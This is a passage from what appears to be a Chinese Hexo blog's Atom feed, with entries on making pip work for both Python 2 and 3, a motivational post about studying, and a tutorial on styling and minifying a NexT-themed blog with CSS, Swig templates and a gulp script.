br>&#x4E00;&#x4E2A;&#x4FEE;&#x6539;&#x6210;<code>python2.exe</code>&#x5373;&#x53EF;</p><p><strong>pip&#x7684;&#x8BBE;&#x7F6E;</strong><br> Python &#x5B89;&#x88C5;&#x5305;&#x9700;&#x8981;&#x7528;&#x5230;&#x5305;&#x7BA1;&#x7406;&#x5DE5;&#x5177;pip&#xFF0C;&#x4F46;&#x662F;&#x5F53;&#x540C;&#x65F6;&#x5B89;&#x88C5;python2&#x548C;python3&#x7684;&#x65F6;&#x5019;&#xFF0C;pip&#x53EA;&#x662F;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x7248;&#x672C;&#xFF0C;&#x4EE5;&#x4E0B;&#x5C06;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x4FEE;&#x6539;&#x65B9;&#x5F0F;&#xFF0C;&#x5373;&#x91CD;&#x65B0;&#x5B89;&#x88C5;&#x4E24;&#x4E2A;&#x7248;&#x672C;&#x7684;pip&#xFF0C;&#x4F7F;&#x5F97;&#x4E24;&#x4E2A;python&#x7248;&#x672C;&#x7684;pip&#x80FD;&#x591F;&#x5171;&#x5B58;&#x3002;<br>&#x8FD0;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x5373;&#x53EF;<br><strong><code>python3 -m pip install --upgrade pip --force-reinstall</code></strong></p><p><strong><code>python2 -m pip install --upgrade pip --force-reinstall</code></strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里我使用Win10-x64的电脑来操作&lt;br&gt;我的Python安装目录&lt;code&gt;C:\Python\&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
      <category term="编程" scheme="https://marnm.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="编程" scheme="https://marnm.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python2" scheme="https://marnm.github.io/tags/Python2/"/>
    
      <category term="pip" scheme="https://marnm.github.io/tags/pip/"/>
    
  </entry>
  
  <entry>
    <title>自由的灵魂必将远航</title>
    <link href="https://marnm.github.io//posts/9e3f6743/"/>
    <id>https://marnm.github.io//posts/9e3f6743/</id>
    <published>2018-08-03T13:55:24.000Z</published>
    <updated>2022-05-27T01:35:29.643Z</updated>
    
    <content type="html"><![CDATA[<p>&#x4F60;&#x80CC;&#x5355;&#x8BCD;&#x65F6;&#xFF0C;&#x963F;&#x62C9;&#x65AF;&#x52A0;&#x7684;&#x9CD5;&#x9C7C;&#x6B63;&#x8DC3;&#x51FA;&#x6C34;&#x9762;&#xFF1B;&#x4F60;&#x7B97;&#x6570;&#x5B66;&#x65F6;&#xFF0C;&#x592A;&#x5E73;&#x6D0B;&#x5F7C;&#x5CB8;&#x7684;&#x6D77;&#x9E25;&#x632F;&#x7FC5;&#x63A0;&#x8FC7;&#x57CE;&#x5E02;&#x4E0A;&#x7A7A;&#xFF1B;&#x4F60;&#x665A;&#x81EA;&#x4E60;&#x65F6;&#xFF0C;&#x6781;&#x5708;&#x4E0A;&#x7684;&#x591C;&#x7A7A;&#x6563;&#x6F2B;&#x4E86;&#x4E94;&#x5F69;&#x6591;&#x6593;&#xFF1B;&#x4F46;&#x662F;&#x5C11;&#x5E74;&#x4F60;&#x522B;&#x7740;&#x6025;&#xFF0C;&#x5728;&#x4F60;&#x4E3A;&#x81EA;&#x5DF1;&#x672A;&#x6765;&#x8E0F;&#x8E0F;&#x5B9E;&#x5B9E;&#x5730;&#x52AA;&#x529B;&#x65F6;&#xFF0C;&#x90A3;&#x4E9B;&#x4F60;&#x611F;&#x89C9;&#x4ECE;&#x6765;&#x4E0D;&#x4F1A;&#x770B;&#x5230;&#x7684;&#x666F;&#x8272;&#xFF0C;&#x90A3;&#x4E9B;&#x4F60;&#x89C9;&#x5F97;&#x7EC8;&#x8EAB;&#x4E0D;&#x4F1A;&#x9047;&#x5230;&#x7684;&#x4EBA;&#xFF0C;&#x6B63;&#x4E00;&#x6B65;&#x6B65;&#x5411;&#x4F60;&#x8D70;&#x6765;&#x3002;<br><a id="more"></a><br>&#x6211;&#x60F3;&#x8C61;&#x4E0D;&#x5230;&#x5728;&#x8FD9;&#x4E2A;&#x661F;&#x7403;&#x53D1;&#x751F;&#x7684;&#x5F88;&#x591A;&#x7F8E;&#x597D;&#x7684;&#x666F;&#x8C61;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x624D;&#x52AA;&#x529B;&#xFF0C;&#x56E0;&#x4E3A;&#x4E16;&#x754C;&#x90A3;&#x4E48;&#x5927;&#xFF0C;&#x6211;&#x60F3;&#x53BB;&#x770B;&#x770B;&#x3002;</p><p>&#x4F9D;&#x7136;&#x8FD8;&#x662F;&#x5F88;&#x559C;&#x6B22;&#x8FD9;&#x53E5;&#x8BDD;&#xFF0C;</p><p>&#x6211;&#x8FD8;&#x5728;&#x52AA;&#x529B;&#xFF0C;&#x6240;&#x4EE5;&#x7B49;&#x7B49;&#x6211;</p><p>&#x563B;&#x563B;&#xFF0C;&#x539F;&#x6765;&#x8FD9;&#x53E5;&#x8BDD;&#xFF0C;&#x4E0D;&#x7B97;&#x9E21;&#x6C64;&#x5440;<br><img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1ftxmperp0kj30k00b9q82.jpg" alt="img"></p><p>&#x5B66;&#x5F1F;&#x5B66;&#x59B9;&#x4E5F;&#x52A0;&#x6CB9;&#xFF0C;&#x6211;&#x5728;&#x8DDD;&#x79BB;&#x6E05;&#x534E;5&#x516C;&#x91CC;&#x5916;&#x7684;</p><p>&#x5317;&#x56DB;&#x73AF;&#xFF0C;&#x7B49;&#x4F60;</p><p>&#x53EA;&#x662F;&#x4E2A;&#x6C89;&#x9ED8;&#x7684;&#x5927;&#x591A;&#x6570;</p><p>&#x591A;&#x8BF4;&#x4E86;&#x51E0;&#x53E5;&#x8BDD;&#x3002;</p><p>&#x8FD9;&#x53E5;&#x8BDD;&#xFF0C;&#x597D;&#x50CF;&#x6211;&#x60F3;&#x5728;&#x7684;&#x751F;&#x6D3B;&#x72B6;&#x6001;</p><p>&#x5FEB;&#x8282;&#x594F;&#x7684;&#x751F;&#x6D3B;</p><p>&#x5F53;&#x4F60;&#x8BA4;&#x771F;&#x8D77;&#x6765;&#x7684;&#x6837;&#x5B50;&#x771F;&#x7684;&#x6709;&#x70B9;&#x53EF;&#x7231;<br><img src="https://wx4.sinaimg.cn/mw690/006ALkzYly1ftxmrj5vi8j30k00jcqet.jpg" alt="doge | 300x300"><br><img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1ftxmsdymwzj30k00f0gzn.jpg" alt="books"><br>to be or not to be.<br>that is the question.<br>&#x8C28;&#x4EE5;&#x6B64;&#x53E5;&#x732E;&#x7ED9;&#x5728;&#x8FF7;&#x96FE;&#x4E2D;&#x7825;&#x783A;&#x524D;&#x884C;&#x7684;&#x6211;&#x4EEC;</p><p>&#x540E;&#x7EED;&#x2026;<br>&#x8C22;&#x8C22;&#x5927;&#x5BB6;&#x7684;&#x8D5E;<br>&#x8FD9;&#x53E5;&#x8BDD;&#x4F1A;&#x6709;&#x79CD;&#x83AB;&#x540D;&#x7684;&#x60C5;&#x6000;&#xFF0C;&#x6709;&#x70B9;&#x5C0F;&#x6CBB;&#x6108;&#x3002;<br><strong>&#x5F53;&#x7136;&#xFF0C;&#x52AA;&#x529B;&#x4E0D;&#x662F;&#x81EA;&#x6211;&#x611F;&#x52A8;</strong><br><strong>&#x6700;&#x6015;&#x4F60;&#x4E00;&#x76F4;&#x5FD9;&#x5FD9;&#x788C;&#x788C;</strong><br><strong>&#x5230;&#x5934;&#x6765;&#x8FD8;&#x5728;&#x4EBA;&#x6D77;&#x91CC;&#x6D6E;&#x6C89;&#x3002;</strong><br><strong>&#x6709;&#x8DA3;&#x7684;&#x7075;&#x9B42;&#x548C;&#x52AA;&#x529B;&#x7684;&#x4F60;&#x90FD;&#x8981;&#x5728;&#x8DEF;&#x4E0A;</strong></p><hr><p>&#x6765;&#x81EA;<code>&#x77E5;&#x4E4E;</code><a href="https://www.zhihu.com/question/274001514/answer/405301907" target="_blank" rel="noopener">&#x5F53;&#x4EE3;&#x5927;&#x5B66;&#x751F;&#x6709;&#x591A;&#x52AA;&#x529B;&#xFF1F;</a><code>@&#x859B;&#x5B9A;&#x8C14;&#x7684; en</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;你背单词时，阿拉斯加的鳕鱼正跃出水面；你算数学时，太平洋彼岸的海鸥振翅掠过城市上空；你晚自习时，极圈上的夜空散漫了五彩斑斓；但是少年你别着急，在你为自己未来踏踏实实地努力时，那些你感觉从来不会看到的景色，那些你觉得终身不会遇到的人，正一步步向你走来。&lt;br&gt;
    
    </summary>
    
    
      <category term="生活" scheme="https://marnm.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="努力" scheme="https://marnm.github.io/tags/%E5%8A%AA%E5%8A%9B/"/>
    
      <category term="学习" scheme="https://marnm.github.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>NexT主题优化+美化</title>
    <link href="https://marnm.github.io//posts/60444925/"/>
    <id>https://marnm.github.io//posts/60444925/</id>
    <published>2018-07-27T12:16:41.000Z</published>
    <updated>2022-05-26T13:32:07.811Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h3><p>&#x5173;&#x4E8E;Hexo&#x535A;&#x5BA2;NexT&#x4E3B;&#x9898;&#x7F8E;&#x5316;&#x5C31;&#x4E0D;&#x4E00;&#x4E00;&#x5217;&#x4E3E;&#x7684;&#xFF0C;&#x7F51;&#x4E0A;&#x6559;&#x7A0B;&#x4E00;&#x5927;&#x5806;&#xFF0C;&#x6211;&#x5C31;&#x5217;&#x51FA;&#x4E00;&#x4E9B;&#x4E2A;&#x4EBA;&#x89C9;&#x5F97;&#x6BD4;&#x8F83;&#x5B9E;&#x7528;&#x7684;</p><h3 id="1-0-&#x89C6;&#x89C9;&#x4F18;&#x5316;&#x4E0E;&#x6027;&#x80FD;&#x4F18;&#x5316;"><a href="#1-0-&#x89C6;&#x89C9;&#x4F18;&#x5316;&#x4E0E;&#x6027;&#x80FD;&#x4F18;&#x5316;" class="headerlink" title="1.0 &#x89C6;&#x89C9;&#x4F18;&#x5316;&#x4E0E;&#x6027;&#x80FD;&#x4F18;&#x5316;"></a>1.0 &#x89C6;&#x89C9;&#x4F18;&#x5316;&#x4E0E;&#x6027;&#x80FD;&#x4F18;&#x5316;</h3><a id="more"></a><h5 id="1-1-&#x66F4;&#x6539;&#x5B57;&#x4F53;"><a href="#1-1-&#x66F4;&#x6539;&#x5B57;&#x4F53;" class="headerlink" title="1.1 &#x66F4;&#x6539;&#x5B57;&#x4F53;"></a>1.1 &#x66F4;&#x6539;&#x5B57;&#x4F53;</h5><blockquote><p><code>themes\next\source\css\\_varibles\custom.styl</code></p></blockquote><pre><code class="cs">// &#x6807;&#x9898;&#xFF0C;&#x4FEE;&#x6539;&#x6210;&#x4F60;&#x671F;&#x671B;&#x7684;&#x5B57;&#x4F53;&#x65CF;$font-family-headings = Georgia, sans// &#x4FEE;&#x6539;&#x6210;&#x4F60;&#x671F;&#x671B;&#x7684;&#x5B57;&#x4F53;&#x65CF;$font-family-base = &quot;Microsoft YaHei&quot;, Verdana, sans-serif// &#x4EE3;&#x7801;&#x5B57;&#x4F53;$code-font-family = &quot;Input Mono&quot;, &quot;PT Mono&quot;, Consolas, Monaco, Menlo, monospace// &#x6B63;&#x6587;&#x5B57;&#x4F53;&#x7684;&#x5927;&#x5C0F;$font-size-base = 16px// &#x4EE3;&#x7801;&#x5B57;&#x4F53;&#x7684;&#x5927;&#x5C0F;$code-font-size = 13px</code></pre><h5 id="1-2-&#x4FEE;&#x6539;&#x884C;&#x8DDD;&#x548C;&#x95F4;&#x8DDD;"><a href="#1-2-&#x4FEE;&#x6539;&#x884C;&#x8DDD;&#x548C;&#x95F4;&#x8DDD;" class="headerlink" title="1.2 &#x4FEE;&#x6539;&#x884C;&#x8DDD;&#x548C;&#x95F4;&#x8DDD;"></a>1.2 &#x4FEE;&#x6539;&#x884C;&#x8DDD;&#x548C;&#x95F4;&#x8DDD;</h5><blockquote><p><code>themes\next\source\css\\_varibles\base.styl</code></p></blockquote><pre><code class="CS">// &#x5168;&#x6587;&#x95F4;&#x8DDD;&#x53C2;&#x6570;$line-height-base           = 1.8$line-height-code-block     = 1.6  // Can&apos;t be less than 1.3</code></pre><h5 id="1-3-&#x4F7F;&#x7528;gulp&#x538B;&#x7F29;hexo&#x535A;&#x5BA2;"><a href="#1-3-&#x4F7F;&#x7528;gulp&#x538B;&#x7F29;hexo&#x535A;&#x5BA2;" class="headerlink" title="1.3 &#x4F7F;&#x7528;gulp&#x538B;&#x7F29;hexo&#x535A;&#x5BA2;"></a>1.3 &#x4F7F;&#x7528;gulp&#x538B;&#x7F29;hexo&#x535A;&#x5BA2;</h5><p>&#x5B89;&#x88C5;gulp</p><pre><code>npm install gulp -g</code></pre><p>&#x5B89;&#x88C5;gulp&#x4F9D;&#x8D56;&#x6A21;&#x5757;</p><blockquote><ul><li>gulp-htmlclean  //&#x6E05;&#x7406;HTML</li><li>gulp-htmlmin //&#x538B;&#x7F29;HTML</li><li>gulp-minify //&#x538B;&#x7F29;CSS</li><li>gulp-uglify //&#x6DF7;&#x6DC6;js</li><li>gulp-imagemin //&#x538B;&#x7F29;&#x56FE;&#x7247;</li></ul></blockquote><pre><code>npm install gulp-htmlclean gulp-htmlmin gulp-minify-css gulp-uglify gulp-imagemin --save</code></pre><p>&#x5B89;&#x88C5;&#x5B8C;&#x53EF;&#x4EE5;&#x5728;&#x6839;&#x76EE;&#x5F55;<code>package.json</code>&#x6587;&#x4EF6;&#x91CC;&#x770B;&#x5230;</p><pre><code class="json">&quot;dependencies&quot;: {    &quot;gulp&quot;: &quot;^3.9.1&quot;,    &quot;gulp-imagemin&quot;: &quot;^4.1.0&quot;,    ...    ...  },  &quot;devDependencies&quot;: {    &quot;babel-core&quot;: &quot;^6.26.3&quot;,    &quot;gulp-babel&quot;: &quot;^7.0.1&quot;,    &quot;gulp-htmlclean&quot;: &quot;^2.7.22&quot;,    &quot;gulp-htmlmin&quot;: &quot;^4.0.0&quot;,    &quot;gulp-minify-css&quot;: &quot;^1.2.4&quot;,    &quot;gulp-uglify&quot;: &quot;^3.0.1&quot;  }</code></pre><p>&#x5728;&#x535A;&#x5BA2;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x624B;&#x52A8;&#x6DFB;&#x52A0;<code>gulpfile.js</code>&#x6587;&#x4EF6;</p><pre><code class="JavaScript">var gulp = require(&apos;gulp&apos;);var minifycss = require(&apos;gulp-minify-css&apos;);var uglify = require(&apos;gulp-uglify&apos;);var htmlmin = require(&apos;gulp-htmlmin&apos;);var htmlclean = require(&apos;gulp-htmlclean&apos;);var imagemin = require(&apos;gulp-imagemin&apos;);// &#x538B;&#x7F29;htmlgulp.task(&apos;minify-html&apos;, function() {    return gulp.src(&apos;./public/**/*.html&apos;)        .pipe(htmlclean())        .pipe(htmlmin({            removeComments: true,            minifyJS: true,            minifyCSS: true,            minifyURLs: true,        }))        .pipe(gulp.dest(&apos;./public&apos;))});// &#x538B;&#x7F29;cssgulp.task(&apos;minify-css&apos;, function() {    return gulp.src(&apos;./public/**/*.css&apos;)        .pipe(minifycss({            compatibility: &apos;ie8&apos;        }))        .pipe(gulp.dest(&apos;./public&apos;));});// &#x538B;&#x7F29;jsgulp.task(&apos;minify-js&apos;, function() {    return gulp.src(&apos;./public/js/**/*.js&apos;)        .pipe(uglify())        .pipe(gulp.dest(&apos;./public&apos;));});// &#x538B;&#x7F29;&#x56FE;&#x7247;gulp.task(&apos;minify-images&apos;, function() {    return gulp.src(&apos;./public/images/**/*.*&apos;)        .pipe(imagemin(        [imagemin.gifsicle({&apos;optimizationLevel&apos;: 3}),         imagemin.jpegtran({&apos;progressive&apos;: true}),         imagemin.optipng({&apos;optimizationLevel&apos;: 7}),         imagemin.svgo()],        {&apos;verbose&apos;: true}))        .pipe(gulp.dest(&apos;./public/images&apos;))});// &#x9ED8;&#x8BA4;&#x4EFB;&#x52A1;gulp.task(&apos;default&apos;, [    &apos;minify-html&apos;,&apos;minify-css&apos;,&apos;minify-js&apos;,&apos;minify-images&apos;]);</code></pre><p>&#x76F4;&#x63A5;&#x8FD0;&#x884C;<code>gulp</code>&#x547D;&#x4EE4;&#x5F00;&#x59CB;&#x538B;&#x7F29;</p><p><strong>&#x53C2;&#x8003;&#x94FE;&#x63A5;</strong></p><p><a href="http://fengdi.org/2017/08/07/Hexo%E5%8D%9A%E5%AE%A2%E4%B9%8B%E9%80%9F%E5%BA%A6%E4%BC%98%E5%8C%96.html" target="_blank" rel="noopener">Hexo&#x535A;&#x5BA2;&#x4E4B;&#x901F;&#x5EA6;&#x4F18;&#x5316;</a></p><p><a href="https://www.karlzhou.com/articles/compress-minify-hexo/" target="_blank" rel="noopener">&#x4F18;&#x5316;Hexo&#x535A;&#x5BA2; - &#x538B;&#x7F29; HTML&#x3001;CSS&#x3001;JS&#x3001;IMG &#x7B49;</a></p><p><a href="https://www.liuxinggang.com/2016-12-06-hexo%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6%EF%BC%8D%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/" target="_blank" rel="noopener">hexo&#x535A;&#x5BA2;&#x8FDB;&#x9636; - &#x6027;&#x80FD;&#x4F18;&#x5316;</a> </p><h3 id="2-0-&#x4E3B;&#x9898;&#x7F8E;&#x5316;&#x4E0E;&#x4E3B;&#x9898;&#x4FEE;&#x6539;"><a href="#2-0-&#x4E3B;&#x9898;&#x7F8E;&#x5316;&#x4E0E;&#x4E3B;&#x9898;&#x4FEE;&#x6539;" class="headerlink" title="2.0 &#x4E3B;&#x9898;&#x7F8E;&#x5316;&#x4E0E;&#x4E3B;&#x9898;&#x4FEE;&#x6539;"></a>2.0 &#x4E3B;&#x9898;&#x7F8E;&#x5316;&#x4E0E;&#x4E3B;&#x9898;&#x4FEE;&#x6539;</h3><h5 id="2-1-&#x4FEE;&#x6539;&#x5B57;&#x4F53;&#x989C;&#x8272;"><a href="#2-1-&#x4FEE;&#x6539;&#x5B57;&#x4F53;&#x989C;&#x8272;" class="headerlink" title="2.1 &#x4FEE;&#x6539;&#x5B57;&#x4F53;&#x989C;&#x8272;"></a>2.1 &#x4FEE;&#x6539;&#x5B57;&#x4F53;&#x989C;&#x8272;</h5><h5 id="2-2-&#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5185;&#x94FE;&#x63A5;&#x6587;&#x672C;&#x6837;&#x5F0F;"><a href="#2-2-&#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5185;&#x94FE;&#x63A5;&#x6587;&#x672C;&#x6837;&#x5F0F;" class="headerlink" title="2.2 &#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5185;&#x94FE;&#x63A5;&#x6587;&#x672C;&#x6837;&#x5F0F;"></a>2.2 &#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5185;&#x94FE;&#x63A5;&#x6587;&#x672C;&#x6837;&#x5F0F;</h5><blockquote><p><code>theme\next\source\css\\_common\components\post\post.styl</code></p></blockquote><pre><code class="css">// &#x5728;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;// &#x6587;&#x7AE0;&#x5185;&#x94FE;&#x63A5;&#x6587;&#x672C;&#x6837;&#x5F0F;.post-body p a{  color: #0593d3;  border-bottom: none;  border-bottom: 1px solid #0593d3;  &amp;:hover {    color: #fc6423;    border-bottom: none;    border-bottom: 1px solid #fc6423;  }}</code></pre><h5 id="2-3-&#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5E95;&#x90E8;&#x6807;&#x7B7E;&#x7684;-&#x53F7;"><a href="#2-3-&#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5E95;&#x90E8;&#x6807;&#x7B7E;&#x7684;-&#x53F7;" class="headerlink" title="2.3 &#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5E95;&#x90E8;&#x6807;&#x7B7E;&#x7684;#&#x53F7;"></a>2.3 &#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5E95;&#x90E8;&#x6807;&#x7B7E;&#x7684;#&#x53F7;</h5><blockquote><p><code>/themes/next/layout/_macro/post.swig</code></p><p>&#x641C;&#x7D22;<code>rel=&quot;tag&quot;</code>&#xFF0C;&#x5C06;#&#x6362;&#x6210;<code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code></p></blockquote><h5 id="2-4-&#x5728;&#x6BCF;&#x7BC7;&#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x201C;&#x7ED3;&#x675F;&#x201D;&#x6807;&#x8BB0;"><a href="#2-4-&#x5728;&#x6BCF;&#x7BC7;&#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x201C;&#x7ED3;&#x675F;&#x201D;&#x6807;&#x8BB0;" class="headerlink" title="2.4 &#x5728;&#x6BCF;&#x7BC7;&#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x201C;&#x7ED3;&#x675F;&#x201D;&#x6807;&#x8BB0;"></a>2.4 &#x5728;&#x6BCF;&#x7BC7;&#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x201C;&#x7ED3;&#x675F;&#x201D;&#x6807;&#x8BB0;</h5><blockquote><p>&#x5728;<code>\themes\next\layout\_macro</code>&#x4E2D;&#x65B0;&#x5EFA;<code>passage-end-tag.swig&#x6587;&#x4EF6;</code></p></blockquote><pre><code class="html">&lt;div&gt;    {% if not is_index %}        <div style="text-align:center;color: #ccc;font-size:14px;">-------------Ending-------------</div>    {% endif %}&lt;/div&gt;</code></pre><p>&#x63A5;&#x7740;&#x6253;&#x5F00;<code>\themes\next\layout\_macro\post.swig</code>&#xFF0C;&#x5728;<code>post-body</code>&#x4E4B;&#x540E;&#x548C;<code>post-footer</code>&#x4E4B;&#x524D;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x4EE3;&#x7801;</p><pre><code class="html">    &lt;div&gt;      {% if not is_index %}        {% include &apos;post-end-tag.swig&apos; %}      {% endif %}    &lt;/div&gt;</code></pre><p>&#x7136;&#x540E;&#x5728;<code>&#x4E3B;&#x9898;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</code>&#x672B;&#x5C3E;&#x6DFB;&#x52A0;</p><pre><code class="html"># &#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x201C;&#x672C;&#x6587;&#x7ED3;&#x675F;&#x201D;&#x6807;&#x8BB0;passage_end_tag:  enabled: true</code></pre><h5 id="2-5-&#x4FEE;&#x6539;&#x4F5C;&#x8005;&#x5934;&#x50CF;&#x6837;&#x5F0F;"><a href="#2-5-&#x4FEE;&#x6539;&#x4F5C;&#x8005;&#x5934;&#x50CF;&#x6837;&#x5F0F;" class="headerlink" title="2.5 &#x4FEE;&#x6539;&#x4F5C;&#x8005;&#x5934;&#x50CF;&#x6837;&#x5F0F;"></a>2.5 &#x4FEE;&#x6539;&#x4F5C;&#x8005;&#x5934;&#x50CF;&#x6837;&#x5F0F;</h5><p>&#x6253;&#x5F00;<code>\themes\next\source\css\_common\components\sidebar\sidebar-author.styl</code></p><pre><code class="CSS">.site-author-image {  display: block;  margin: 0 auto;  padding: $site-author-image-padding;  max-width: $site-author-image-width;  height: $site-author-image-height;  border: $site-author-image-border-width solid $site-author-image-border-color;  /* &#x5934;&#x50CF;&#x5706;&#x5F62; */  border-radius: 80px;  -webkit-border-radius: 80px;  -moz-border-radius: 80px;  box-shadow: inset 0 -1px 0 #333sf;  /* &#x8BBE;&#x7F6E;&#x5FAA;&#x73AF;&#x52A8;&#x753B; [animation: (play)&#x52A8;&#x753B;&#x540D;&#x79F0; (2s)&#x52A8;&#x753B;&#x64AD;&#x653E;&#x65F6;&#x957F;&#x5355;&#x4F4D;&#x79D2;&#x6216;&#x5FAE;&#x79D2; (ase-out)&#x52A8;&#x753B;&#x64AD;&#x653E;&#x7684;&#x901F;&#x5EA6;&#x66F2;&#x7EBF;&#x4E3A;&#x4EE5;&#x4F4E;&#x901F;&#x7ED3;&#x675F;     (1s)&#x7B49;&#x5F85;1&#x79D2;&#x7136;&#x540E;&#x5F00;&#x59CB;&#x52A8;&#x753B; (1)&#x52A8;&#x753B;&#x64AD;&#x653E;&#x6B21;&#x6570;(infinite&#x4E3A;&#x5FAA;&#x73AF;&#x64AD;&#x653E;) ]*/  /* &#x9F20;&#x6807;&#x7ECF;&#x8FC7;&#x5934;&#x50CF;&#x65CB;&#x8F6C;360&#x5EA6; */  -webkit-transition: -webkit-transform 1.0s ease-out;  -moz-transition: -moz-transform 1.0s ease-out;  transition: transform 1.0s ease-out;}img:hover {  /* &#x9F20;&#x6807;&#x7ECF;&#x8FC7;&#x505C;&#x6B62;&#x5934;&#x50CF;&#x65CB;&#x8F6C;   -webkit-animation-play-state:paused;  animation-play-state:paused;*/  /* &#x9F20;&#x6807;&#x7ECF;&#x8FC7;&#x5934;&#x50CF;&#x65CB;&#x8F6C;360&#x5EA6; */  -webkit-transform: rotateZ(360deg);  -moz-transform: rotateZ(360deg);  transform: rotateZ(360deg);}/* Z &#x8F74;&#x65CB;&#x8F6C;&#x52A8;&#x753B; */@-webkit-keyframes play {  0% {    -webkit-transform: rotateZ(0deg);  }  100% {    -webkit-transform: rotateZ(-360deg);  }}@-moz-keyframes play {  0% {    -moz-transform: rotateZ(0deg);  }  100% {    -moz-transform: rotateZ(-360deg);  }}@keyframes play {  0% {    transform: rotateZ(0deg);  }  100% {    transform: rotateZ(-360deg);  }}</code></pre><h5 id="2-6-&#x4FEE;&#x6539;&#x4EE3;&#x7801;&#x5757;&#x6837;&#x5F0F;"><a href="#2-6-&#x4FEE;&#x6539;&#x4EE3;&#x7801;&#x5757;&#x6837;&#x5F0F;" class="headerlink" title="2.6 &#x4FEE;&#x6539;&#x4EE3;&#x7801;&#x5757;&#x6837;&#x5F0F;"></a>2.6 &#x4FEE;&#x6539;<code></code>&#x4EE3;&#x7801;&#x5757;&#x6837;&#x5F0F;</h5><p><code>\themes\next\source\css\_custom\custom.styl</code></p><pre><code class="css">&#x5411;&#x91CC;&#x9762;&#x52A0;&#x5165;&#xFF1A;(&#x989C;&#x8272;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x5B9A;&#x4E49;)// Custom styles.code {    color: #ff7600;    background: #fbf7f8;    margin: 2px;}// &#x5927;&#x4EE3;&#x7801;&#x5757;&#x7684;&#x81EA;&#x5B9A;&#x4E49;&#x6837;&#x5F0F;.highlight, pre {    margin: 5px 0;    padding: 5px;    border-radius: 3px;}.highlight, code, pre {    border: 1px solid #d6d6d6;}</code></pre><h5 id="2-7-&#x53D6;&#x6D88;&#x4FA7;&#x8FB9;&#x680F;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#x5BF9;&#x6807;&#x9898;&#x7684;&#x81EA;&#x52A8;&#x7F16;&#x53F7;"><a href="#2-7-&#x53D6;&#x6D88;&#x4FA7;&#x8FB9;&#x680F;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#x5BF9;&#x6807;&#x9898;&#x7684;&#x81EA;&#x52A8;&#x7F16;&#x53F7;" class="headerlink" title="2.7 &#x53D6;&#x6D88;&#x4FA7;&#x8FB9;&#x680F;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#x5BF9;&#x6807;&#x9898;&#x7684;&#x81EA;&#x52A8;&#x7F16;&#x53F7;"></a>2.7 &#x53D6;&#x6D88;&#x4FA7;&#x8FB9;&#x680F;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#x5BF9;&#x6807;&#x9898;&#x7684;&#x81EA;&#x52A8;&#x7F16;&#x53F7;</h5><p>&#x6253;&#x5F00;&#x4E3B;&#x9898;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5C06;<code>number:</code>&#x53D8;&#x91CF;&#x6539;&#x6210;false&#x5373;&#x53EF;</p><pre><code>number: false</code></pre><h5 id="2-8-&#x4FEE;&#x6539;&#x4FA7;&#x8FB9;&#x680F;&#x7684;&#x80CC;&#x666F;&#x56FE;&#x7247;-amp-&#x989C;&#x8272;"><a href="#2-8-&#x4FEE;&#x6539;&#x4FA7;&#x8FB9;&#x680F;&#x7684;&#x80CC;&#x666F;&#x56FE;&#x7247;-amp-&#x989C;&#x8272;" class="headerlink" title="2.8 &#x4FEE;&#x6539;&#x4FA7;&#x8FB9;&#x680F;&#x7684;&#x80CC;&#x666F;&#x56FE;&#x7247;&amp;&#x989C;&#x8272;"></a>2.8 